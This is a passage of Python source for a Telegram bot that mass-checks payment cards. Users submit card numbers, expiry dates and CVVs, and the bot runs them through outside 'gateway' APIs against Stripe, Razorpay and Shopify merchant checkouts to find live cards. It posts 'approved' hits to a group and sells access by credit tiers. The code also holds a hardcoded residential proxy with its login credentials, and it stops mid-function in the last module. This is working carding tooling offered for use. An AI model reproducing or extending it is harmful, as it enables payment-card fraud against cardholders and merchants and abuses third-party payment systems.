            if stop_event and stop_event.is_set():
                logger.info(f"Process stopped before batch {i//BATCH_SIZE}")
                break
            
            # Get batch of cards
            batch = cards[i:i + BATCH_SIZE]
            
            # Create tasks for this batch
            tasks = []
            for card in batch:
                tasks.append(mau_check_card(card, user_info, stop_event))
            
            # Run tasks in parallel (wait for all 5 to finish)
            results = await asyncio.gather(*tasks)
            
            # Process results
            for result in results:
                # Check if process was stopped during processing
                if stop_event and stop_event.is_set():
                    break
                
                # Check if result is valid
                if not result:
                    stats["error"] += 1
                    stats["checked"] += 1
                    continue
                
                # Format response
                formatted_response, status_category = mau_format_response_stripe_auth(result, user_info)
                
                # Update stats
                stats["checked"] += 1
                if status_category == "approved":
                    stats["approved"] += 1
                    # Send approved result immediately to user's DM
                    try:
                        await safe_send_message(context, user_info.get("id"), formatted_response)
                        logger.info(f"Sent approved result to user {user_info.get('id')} for card {result.get('card_details', '')[:6]}******")
                        
                        # Send hit detection message to group for approved cards
                        try:
                            hit_message = mau_format_hit_detected_message(result, user_info)
                            await safe_send_message(context, HIT_DETECTION_GROUP_ID, hit_message)
                            logger.info(f"Sent hit detection to group for approved card {result.get('card_details', '')[:6]}******")
                        except Exception as e:
                            logger.error(f"Error sending hit detection to group: {str(e)}")
                    except Exception as e:
                        logger.error(f"Error sending approved result to user {user_info.get('id')}: {str(e)}")
                elif status_category == "declined":
                    stats["declined"] += 1
                else:
                    stats["error"] += 1
            
            # Update progress message after each batch (every 5 cards)
            await mau_update_progress_message(context, update, stats, session_id)
            
    except asyncio.CancelledError:
        # The entire process was cancelled
        logger.info(f"MAU mass check process was cancelled for user {user_id}")
        return
    except Exception as e:
        logger.error(f"Error in process_mass_check: {str(e)}", exc_info=True)
    
    # Check if process was stopped by user
    stopped = active_mass_checks.get(session_id, {}).get("stopped", False) or stop_event.is_set()
    
    # Calculate elapsed time
    elapsed_time = round(time.time() - start_time, 2)
    logger.info(f"MAU mass check completed for user {user_id} in {elapsed_time}s")
    
    # Get user credits to check if unlimited
    user_credits = get_user_credits(user_id)
    is_unlimited = user_credits == float('inf')
    
    # Deduct only 1 credit for successful mass check (only if not stopped)
    if not is_unlimited and not stopped:
        update_user_credits(user_id, -1)
        logger.info(f"Deducted 1 credit from user {user_id}")
    
    # Send final stats message with requested format
    try:
        if stopped:
            # Use format_stopped_response which doesn't include stop button
            final_msg = mau_format_stopped_response(stats, elapsed_time, first_name, session_id)
        else:
            # Use format_final_response for normal completion
            final_msg = mau_format_final_response(stats, elapsed_time, first_name, stopped, session_id)
        
        await safe_edit_message_text(
            context,
            update.effective_chat.id,
            active_mass_checks[session_id]["message_id"],
            final_msg
        )
    except Exception as e:
        logger.error(f"Error sending mau final message: {str(e)}")
    
    # Clean up stop flag
    if session_id in active_mass_checks:
        del active_mass_checks[session_id]
    
    logger.info(f"MAU mass check process cleaned up for user {user_id}")

async def handle_stop_command(update: Update, context: CallbackContext):
    """
    Handle /stop command with session ID to stop mass check.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    # Extract session ID from command arguments
    if not context.args:
        # List all active sessions for this user
        user_sessions = [session_id for session_id, data in active_mass_checks.items() if data["user_id"] == user_id]
        
        if not user_sessions:
            await update.message.reply_text(
                "⚠️ <b>No active mass check sessions found.</b>\n\n"
                "<i>Start a mass check with /mau command first.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        
        session_list = "\n".join([f"• <code>{session_id}</code>" for session_id in user_sessions])
        await update.message.reply_text(
            f"📋 <b>Your active mass check sessions:</b>\n\n"
            f"{session_list}\n\n"
            f"<i>Use /stop &lt;session_id&gt; to stop a specific session.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    session_id = context.args[0].upper()
    
    # Check if there's an active mass check for this session ID
    if session_id not in active_mass_checks:
        await update.message.reply_text(
            f"⚠️ <b>No active mass check session found with ID:</b> <code>{session_id}</code>\n\n"
            "<i>Check session ID and try again.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Check if user who sent command is same as one who initiated check
    if active_mass_checks[session_id]["user_id"] != user_id:
        await update.message.reply_text(
            "⛔ <b>Access denied!</b>\n\n"
            "<i>You can only stop your own mass check sessions.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Set stop flag and event for this session - IMMEDIATE STOP
    active_mass_checks[session_id]["stopped"] = True
    stop_event = active_mass_checks[session_id].get("stop_event")
    if stop_event:
        stop_event.set()
    
    logger.info(f"MAU stop requested by user {user_id} for session {session_id}")
    
    # Calculate elapsed time
    start_time = active_mass_checks[session_id].get("start_time", time.time())
    elapsed_time = round(abs(time.time() - start_time), 2)
    
    # Get stats from active_mass_checks
    stats = active_mass_checks[session_id].get("stats", {
        "total": 0,
        "checked": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    })
    
    # Get chat_id and message_id
    chat_id = active_mass_checks[session_id].get("chat_id")
    message_id = active_mass_checks[session_id].get("message_id")
    
    # Update progress message to show "Stopped" without stop button
    if chat_id and message_id:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=mau_format_stopped_response(stats, elapsed_time, first_name, session_id),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            # If we get a "Message is not modified" error, try to send a new message
            if "Message is not modified" in str(e):
                try:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=mau_format_stopped_response(stats, elapsed_time, first_name, session_id),
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    )
                except Exception as e2:
                    logger.error(f"Error sending MAU stop message: {str(e2)}")
            else:
                logger.error(f"Error updating MAU stop message: {str(e)}")
    
    # Send confirmation message to user
    await update.message.reply_text(
        f"✅ <b>Mass check session stopped successfully!</b>\n\n"
        f"<b>Session ID:</b> <code>{session_id}</code>\n"
        f"<b>Cards checked:</b> <code>{stats['checked']}/{stats['total']}</code>\n"
        f"<b>Time elapsed:</b> <code>{elapsed_time}s</code>",
        parse_mode="HTML",
        disable_web_page_preview=True
    )
    
    # NOTE: DO NOT DELETE from active_mass_checks HERE.
    # The main process_mass_check function will handle cleanup after its tasks are fully cancelled.
    # This prevents KeyError race condition.

async def handle_mau_command(update, context):
    """
    Handle /mau command for mass checking Stripe Auth cards.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    logger.info(f"MAU mass Stripe Auth check command received from user {user_id} ({first_name})")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check if user has an active plan (not trial)
    if user_tier == "Trial":
        await update.message.reply_text(
            f"⚠️ <b>Access Denied!</b>\n\n"
            f"<i>This feature is not available for trial users.</i>\n\n"
            f"<b>Current Plan:</b> <code>{user_tier}</code>\n"
            f"<b>Upgrade to access this feature.</b>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"MAU mass check denied for trial user {user_id}")
        return
    
    # Get user credits
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # Check if user provided cards or a file
    cards = []
    
    # Check if a document was provided
    if update.message.document and update.message.document.mime_type == "text/plain":
        # Download the file
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        
        # Try different encodings to handle various file formats
        text = None
        for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
            try:
                text = file_content.decode(encoding)
                logger.info(f"Successfully decoded file with {encoding} encoding for user {user_id}")
                break
            except UnicodeDecodeError:
                continue
        
        if not text:
            # If all encodings fail, try with error handling
            try:
                text = file_content.decode('utf-8', errors='replace')
                logger.warning(f"Decoded file with UTF-8 and error handling for user {user_id}")
            except Exception as e:
                logger.error(f"Failed to decode file for user {user_id}: {str(e)}")
                await safe_send_message(
                    context,
                    update.effective_chat.id,
                    "⚠️ <b>Failed to read file!</b>\n\n"
                    "<i>The file could not be decoded. Please ensure it's a valid text file.</i>"
                )
                return
        
        # Extract cards from text
        cards = extract_cards_from_text(text)
        logger.info(f"Loaded {len(cards)} cards from file for mau user {user_id}")
    # Check if cards were provided as text (after command)
    elif context.args:
        # Get the message text directly to preserve newlines
        message_text = update.message.text
        
        # Remove command and any leading/trailing whitespace
        if message_text.startswith('/mau'):
            message_text = message_text[4:].strip()
        
        # Extract cards from text
        cards = extract_cards_from_text(message_text)
        logger.info(f"Loaded {len(cards)} cards from message for mau user {user_id}")
    # Check if there's a reply to a message with cards
    elif update.message.reply_to_message:
        # Check if replied message has text
        if update.message.reply_to_message.text:
            # Get the text from replied message
            reply_text = update.message.reply_to_message.text
            cards = extract_cards_from_text(reply_text)
            logger.info(f"Loaded {len(cards)} cards from reply for mau user {user_id}")
        # Check if replied message has a document
        elif update.message.reply_to_message.document and update.message.reply_to_message.document.mime_type == "text/plain":
            # Download the file
            file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
            file_content = await file.download_as_bytearray()
            
            # Try different encodings to handle various file formats
            text = None
            for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
                try:
                    text = file_content.decode(encoding)
                    logger.info(f"Successfully decoded replied file with {encoding} encoding for user {user_id}")
                    break
                except UnicodeDecodeError:
                    continue
            
            if not text:
                # If all encodings fail, try with error handling
                try:
                    text = file_content.decode('utf-8', errors='replace')
                    logger.warning(f"Decoded replied file with UTF-8 and error handling for user {user_id}")
                except Exception as e:
                    logger.error(f"Failed to decode replied file for user {user_id}: {str(e)}")
                    await safe_send_message(
                        context,
                        update.effective_chat.id,
                        "⚠️ <b>Failed to read file!</b>\n\n"
                        "<i>The file could not be decoded. Please ensure it's a valid text file.</i>"
                    )
                    return
            
            # Extract cards from text
            cards = extract_cards_from_text(text)
            logger.info(f"Loaded {len(cards)} cards from replied file for mau user {user_id}")
    
    # Validate that we have cards
    if not cards:
        await safe_send_message(
            context,
            update.effective_chat.id,
            "⚠️ <b>No cards provided!</b>\n\n"
            "<i>Usage: /mau followed by cards in separate lines, upload a .txt file with cards, or reply to a message containing cards</i>"
        )
        logger.info(f"MAU mass check denied for user {user_id} - no cards provided")
        return
    
    # Check if number of cards exceeds limit
    if len(cards) > 1500:
        await safe_send_message(
            context,
            update.effective_chat.id,
            f"⚠️ <b>Too many cards provided!</b>\n\n"
            f"<i>Maximum allowed is 1500 cards, but you provided {len(cards)}.</i>"
        )
        logger.info(f"MAU mass check denied for user {user_id} - too many cards: {len(cards)}")
        return
    
    # Check if user has enough credits for all cards (only need 1 credit for successful mass check)
    if not is_unlimited and user_credits < 1:
        await safe_send_message(
            context,
            update.effective_chat.id,
            f"⚠️ <b>Not enough credits!</b>\n\n"
            f"<i>You need at least 1 credit to use mau mass checking.</i>"
        )
        logger.info(f"MAU mass check denied for user {user_id} - insufficient credits")
        return
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Create a background task to process mass check
    logger.info(f"Starting mau mass Stripe Auth check task for user {user_id}")
    asyncio.create_task(mau_process_mass_check(cards, user_info, update, context))



# ============================================================
# MODULE: astripe
# ============================================================
API_BASE_URL = "https://blackxcard-autostripe.onrender.com"
DEFAULT_SITE = "kabusvuya.com"

last_command_time = {}


def astripe_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return card_number, month, year, cvv
    return None


def astripe_extract_card_from_text(text: str) -> Optional[str]:
    patterns = [
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return f"{card_number}|{month}|{year}|{cvv}"
    return None


async def astripe_check_card(card_details: str, user_info: Dict) -> Optional[str]:
    parsed = astripe_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /ast card|mm|yy|cvv</i>"

    card_number, month, year, cvv = parsed

    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")

    cc_string = f"{card_number}|{month}|{year}|{cvv}"
    api_url = f"{API_BASE_URL}/gateway=autostripe/key=Blackxcard/site={DEFAULT_SITE}/cc={cc_string}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as response:
                try:
                    api_response = await response.json()
                except Exception:
                    text = await response.text()
                    api_response = {"status": "Error", "message": text, "decline_code": "unknown"}

        status_val = str(api_response.get("status", "Unknown")).lower()
        msg_val = api_response.get("response", api_response.get("message", "N/A"))
        decline_code = api_response.get("decline_code", "N/A")
        formatted_api_response = f"{msg_val} ({decline_code})"

        if "charged" in status_val or "success" in status_val or "captured" in status_val:
            status_text = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙"
            status_emoji = "🔥"
        elif "approved" in status_val:
            status_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙"
            status_emoji = "🟢"
        elif "declined" in status_val:
            status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
            status_emoji = "❌"
        else:
            status_text = "𝙀𝙧𝙧𝙤𝙧"
            status_emoji = "⚠️"

        return astripe_format_response(formatted_api_response, user_info, card_details, brand, issuer,
                               country_name, country_flag, status_text, status_emoji)

    except Exception as e:
        logger.error(f"Error checking card: {e}")
        return f"⚠️ <b>Error checking card:</b> <code>{e}</code>"


def astripe_format_response(api_response: str, user_info: Dict, card_details: str,
                    brand: str, issuer: str, country_name: str, country_flag: str,
                    status_text: str, status_emoji: str) -> str:
    user_id = user_info.get("id", "Unknown")
    first_name = html.escape(user_info.get("first_name", "User"))
    user_tier = get_user_current_tier(user_id)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"

    formatted = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>{status_text}</b> {status_emoji}</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗔𝘂𝘁𝗼𝗦𝘁𝗿𝗶𝗽𝗲</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{api_response}</code>
<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""

    return formatted


async def handle_ast_command(update, context):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name

    user_tier = get_user_current_tier(user_id)

    current_time = datetime.now()
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML",
            )
            return

    card_details = None
    if context.args:
        card_details = " ".join(context.args)
    elif update.message.reply_to_message:
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = astripe_extract_card_from_text(replied_text)

    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /ast card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /ast</i>",
            parse_mode="HTML",
        )
        return

    user_credits = get_user_credits(user_id)
    is_unlimited = user_credits == float("inf")
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)

    if not has_credits:
        await update.message.reply_text(
            f"<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝘾𝙧𝙚𝙙𝙞𝙩𝙨:</b>\n\n"
            f"<i>You have 0 credits left. Please recharge to continue.</i>\n\n"
            f"<b>Current Tier:</b> <code>{user_tier}</code>",
            parse_mode="HTML",
        )
        return

    last_command_time[user_id] = current_time

    progress_msg = (
        f"<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>\n"
        f"<pre>{card_details}</pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗔𝘂𝘁𝗼𝗦𝘁𝗿𝗶𝗽𝗲</i>"
    )
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")

    user_info = {"id": user_id, "username": username, "first_name": first_name}

    async def background_check():
        try:
            result = await astripe_check_card(card_details, user_info)
            if result and not result.startswith("⚠️"):
                if not is_unlimited:
                    update_user_credits(user_id, -1)
                    updated = get_user_credits(user_id)
                    if updated is not None and updated <= 0:
                        result += "\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>"
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            await checking_message.edit_text(f"⚠️ <b>Error:</b> <code>{e}</code>", parse_mode="HTML")

    asyncio.create_task(background_check())



# ============================================================
# MODULE: rzpv2
# ============================================================
API_URL = "https://rzp.victus.name/rzpv2"

DEFAULT_SITE = "https://pages.razorpay.com/pl_J1vTgGrsLKbLWy/view"
DEFAULT_AMOUNT = "10"
DEFAULT_PROXY = "la.residential.rayobyte.com:8000:itsxaeden_gmail_com:Lomkima123"

last_command_time = {}


def rzpv2_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return card_number, month, year, cvv
    return None


def rzpv2_extract_card_from_text(text: str) -> Optional[str]:
    patterns = [
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return f"{card_number}|{month}|{year}|{cvv}"
    return None


async def rzpv2_check_card(card_details: str, user_info: Dict) -> Optional[str]:
    parsed = rzpv2_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /rzpv2 card|mm|yy|cvv</i>"

    card_number, month, year, cvv = parsed

    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")

    max_retries = 3
    retry_count = 0
    last_error = None
    api_response = None

    while retry_count < max_retries:
        try:
            url = f"{API_URL}?cc={card_number}|{month}|{year}|{cvv}&site={DEFAULT_SITE}&amount={DEFAULT_AMOUNT}&proxy={DEFAULT_PROXY}"

            loop = asyncio.get_event_loop()
            def make_request():
                try:
                    scraper = cloudscraper.create_scraper()
                    return scraper.get(url, timeout=100)
                except Exception as e:
                    return e

            res = await loop.run_in_executor(None, make_request)

            if isinstance(res, Exception):
                api_response = {"status": "Error", "message": str(res)[:150]}
            elif res.status_code != 200:
                api_response = {"status": "Error", "message": f"HTTP {res.status_code}"}
            else:
                try:
                    api_response = res.json()
                except Exception:
                    api_response = {"status": "Error", "message": res.text[:150]}
            break

        except Exception as e:
            logger.error(f"Error checking card (attempt {retry_count + 1}): {e}")
            last_error = str(e)
            retry_count += 1
            if retry_count < max_retries:
                await asyncio.sleep(1)

    if api_response is None:
        return f"⚠️ <b>Error checking card after {max_retries} attempts:</b> <code>{last_error}</code>"

    return rzpv2_format_response(api_response, user_info, card_details, brand, issuer, country_name, country_flag)


def rzpv2_format_response(api_response: Dict, user_info: Dict, card_details: str,
                    brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    message = str(api_response.get("message", "N/A"))
    reason = str(api_response.get("reason", ""))
    status = str(api_response.get("status", "N/A")).lower()

    response_display = f"{message} ({reason})" if reason else message
    check_text = f"{message} {reason}".lower()

    status_emoji = "❓"
    status_text = status

    if "insufficient_funds" in check_text:
        status_emoji = "✅"
        status_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙/𝘾𝙝𝙖𝙧𝙜𝙚"
    elif any(kw in check_text for kw in ["decline", "payment_risk_check_failed", "3d", "3ds", "bank_technical_error"]):
        status_emoji = "❌"
        status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
    elif any(kw in check_text for kw in ["thank", "success", "succeeded", "approved", "charged", "completed"]):
        status_emoji = "✅"
        status_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙/𝘾𝙝𝙖𝙧𝙜𝙚"
    elif "error" in status:
        status_emoji = "⚠️"
        status_text = "𝙀𝙧𝙧𝙤𝙧"
    else:
        status_emoji = "❌"
        status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"

    user_id = user_info.get("id", "Unknown")
    first_name = html.escape(user_info.get("first_name", "User"))
    user_tier = get_user_current_tier(user_id)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"

    formatted_response = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>{status_text}</b> {status_emoji}</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 v2 ₹10</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_display}</code>
<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""

    return formatted_response


async def handle_rzpv2_command(update, context):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name

    user_tier = get_user_current_tier(user_id)

    current_time = datetime.now()
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML",
            )
            return

    card_details = None
    if context.args:
        card_details = " ".join(context.args)
    elif update.message.reply_to_message:
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = rzpv2_extract_card_from_text(replied_text)

    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /rzpv2 card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /rzpv2</i>",
            parse_mode="HTML",
        )
        return

    user_credits = get_user_credits(user_id)
    is_unlimited = user_credits == float("inf")
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)

    if not has_credits:
        await update.message.reply_text(
            f"<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝘾𝙧𝙚𝙙𝙞𝙩𝙨:</b>\n\n"
            f"<i>You have 0 credits left. Please recharge to continue.</i>\n\n"
            f"<b>Current Tier:</b> <code>{user_tier}</code>",
            parse_mode="HTML",
        )
        return

    progress_msg = (
        f"<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>\n"
        f"<pre>{card_details}</pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 v2 ₹10</i>"
    )
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")

    user_info = {"id": user_id, "username": username, "first_name": first_name}

    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time

    async def background_check():
        try:
            result = await rzpv2_check_card(card_details, user_info)
            if result and not result.startswith("⚠️"):
                if not is_unlimited:
                    update_user_credits(user_id, -1)
                    updated = get_user_credits(user_id)
                    if updated is not None and updated <= 0:
                        result += "\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>"
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            await checking_message.edit_text(f"⚠️ <b>Error:</b> <code>{e}</code>", parse_mode="HTML")

    asyncio.create_task(background_check())



# ============================================================
# MODULE: xsh
# ============================================================
API_URL = "https://xaeden.onrender.com/sh"

SHOPIFY_SITES = [
    "https://glovies.myshopify.com",
    "https://naturallclub.com",
    "https://brittnetta.com",
    "https://brightland.co",
]

last_command_time = {}


def xsh_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return card_number, month, year, cvv
    return None


def xsh_extract_card_from_text(text: str) -> Optional[str]:
    patterns = [
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return f"{card_number}|{month}|{year}|{cvv}"
    return None


async def xsh_check_card(card_details: str, user_info: Dict) -> Optional[str]:
    parsed = xsh_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /xsh card|mm|yy|cvv</i>"

    card_number, month, year, cvv = parsed

    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
